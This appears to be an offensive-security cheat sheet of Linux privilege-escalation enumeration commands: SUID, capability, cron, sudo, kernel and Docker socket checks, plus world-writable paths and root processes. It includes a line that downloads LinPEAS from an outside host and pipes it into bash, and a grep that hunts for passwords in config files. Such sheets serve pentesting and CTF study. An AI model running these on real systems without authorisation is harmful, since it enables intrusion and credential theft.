
---
Description :
     Find SUID binaries

Parameters :

```cmd
find / -perm -4000 -type f 2>/dev/null
```

```example
find / -perm -4000 -type f 2>/dev/null
```

Tags :  #linux #privesc #suid #offensive

---

Description :
     Find capabilities binaries

Parameters :

```cmd
getcap -r / 2>/dev/null
```

```example
getcap -r / 2>/dev/null
```

Tags :  #linux #privesc #capabilities #offensive

---

Description :
     Writable cron scripts or world-writable paths in cron

Parameters :

```cmd
grep -R "" /etc/cron* 2>/dev/null; ls -la /etc/cron*
```

```example
grep -R "" /etc/cron* 2>/dev/null; ls -la /etc/cron*
```

Tags :  #linux #privesc #cron #offensive

---

Description :
     List systemd timers

Parameters :

```cmd
systemctl list-timers --all
```

```example
systemctl list-timers --all
```

Tags :  #linux #privesc #systemd #offensive

---

Description :
     Sudo version

Parameters :

```cmd
sudo -V | head -n 5
```

```example
sudo -V | head -n 5
```

Tags :  #linux #privesc #sudo #offensive

---

Description :
     World-writable directories under /

Parameters :

```cmd
find / -type d -perm -0002 2>/dev/null | head -n 50
```

```example
find / -type d -perm -0002 2>/dev/null | head -n 50
```

Tags :  #linux #privesc #permissions #offensive

---

Description :
     Processes running as root

Parameters :

```cmd
ps aux | grep root | head -n 30
```

```example
ps aux | grep root | head -n 30
```

Tags :  #linux #privesc #enum #offensive

---

Description :
     Kernel exploit hint — uname

Parameters :

```cmd
uname -a
```

```example
uname -a
```

Tags :  #linux #privesc #kernel #offensive

---

Description :
     Check for Docker socket

Parameters :

```cmd
ls -la /var/run/docker.sock 2>/dev/null
```

```example
ls -la /var/run/docker.sock 2>/dev/null
```

Tags :  #linux #privesc #docker #offensive

---

Description :
     LinPEAS download and run (curl pipe bash)

Parameters : #url

```cmd
curl -sL "{{url}}" | bash
```

```example
curl -sL "http://10.10.14.2/linpeas.sh" | bash
```

Tags :  #linux #privesc #linpeas #offensive

---

Description :
     Search readable *.conf for keyword password

Parameters :

```cmd
grep -Rni "password" /home /var/www /etc 2>/dev/null | head -n 40
```

```example
grep -Rni "password" /home /var/www /etc 2>/dev/null | head -n 40
```

Tags :  #linux #privesc #creds #offensive

---

Description :
     List current user groups

Parameters :

```cmd
id; groups
```

```example
id; groups
```

Tags :  #linux #privesc #enum #offensive

---
